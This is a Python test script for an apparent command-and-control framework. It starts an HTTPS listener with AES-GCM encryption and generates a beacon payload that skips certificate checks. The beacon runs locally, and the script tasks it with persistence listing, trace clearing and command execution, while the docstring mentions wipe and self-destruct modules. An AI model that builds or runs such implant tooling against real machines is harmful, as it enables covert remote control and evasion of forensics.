#!/usr/bin/env python3
"""Test the HTTPS + AES-GCM encrypted C2 channel with a real beacon subprocess,
plus module commands (persistence list, wipe, selfdestruct) delivered over it."""
import os, sys, time, subprocess, shutil, hashlib
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cs.server import TeamServer
from cs.payload import write_payload

DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_tls")
shutil.rmtree(DATA, ignore_errors=True)

KEY = "s3cret-test-key"
PORT = 19344
srv = TeamServer(data_dir=DATA)
lis, err = srv.start_https_listener("tl", "127.0.0.1", PORT, crypto_key=KEY)
assert not err, f"HTTPS listener failed: {err}"
print("[+] HTTPS+AES listener:", lis.url, "| TLS:", lis.scheme)

# payload with same key + no-verify for self-signed cert
bp = os.path.join(DATA, "bp.py")
write_payload(f"https://127.0.0.1:{PORT}", bp, interval=1, jitter=0, key=KEY, no_verify=True)
print("[+] payload written (https + aes key + no-verify)")

bid = hashlib.sha1(b"tls-beacon").hexdigest()[:16]
proc = subprocess.Popen([sys.executable, "-u", bp, "--name", bid],
                        stdout=open(os.path.join(DATA, "beacon.log"), "w"),
                        stderr=subprocess.STDOUT)
dl = time.time() + 12
while time.time() < dl and not srv.store.all():
    time.sleep(0.3)
if not srv.store.all():
    print("[!] beacon never checked in over TLS")
    print(open(os.path.join(DATA, "beacon.log")).read())
    proc.kill(); sys.exit(1)
sid = srv.store.all()[0]["id"]
print("[+] session over HTTPS+AES:", sid)

# task a module command over the encrypted channel
srv.task(sid, "persist list")
srv.task(sid, "cleanmru /tmp/nonexistent_test")
srv.task(sid, "exec 6*7")
time.sleep(6)

final = srv.store.get(sid)
print("\n=== results ===")
results = ""
for r in final["results"]:
    results += r["data"] + "\n"
    print("---", r["data"][:150])
proc.terminate()
srv.stop_listener("tl")

ok = ("42" in results) and ("shell-profile" in results or "cron" in results)
print("\n[PASS]" if ok else "[FAIL]", "HTTPS+AES channel + module tasking")
sys.exit(0 if ok else 1)
